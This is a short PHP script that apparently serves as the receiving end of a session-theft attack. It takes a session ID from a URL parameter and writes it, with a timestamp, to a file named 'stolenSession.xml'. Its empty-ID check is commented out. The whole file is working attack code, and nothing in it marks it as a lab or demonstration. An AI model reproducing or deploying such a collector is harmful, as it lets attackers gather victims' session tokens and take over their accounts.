<?php
/**
 * Created by PhpStorm.
 * User: amer
 * Date: 3/21/17
 * Time: 7:26 PM
 */
    $_POST = array(); //workaround for broken PHPstorm
    parse_str(file_get_contents('php://input'), $_POST);

    $errors = array();
    $sessionID = $_GET['SESSID'];


  if($sessionID == ''){
      $errors[] = 'Nije dostupan session id!';
  }

#  if(count($errors) == 0){
      $xml = new SimpleXMLElement('<?xml version="1.0" encoding="utf-8"?><sessions></sessions>');
      $xml->addAttribute('version', '1.0');
      $xml->addChild('datetime', date('Y-m-d H:i:s'));

      $variable = $xml->addChild('ses');
      $variable->addChild('admin', $sessionID);
      echo $xml->asXML('stolenSession.xml');
    #  die;

 # }
 # else echo "Nije dostupan session id!";
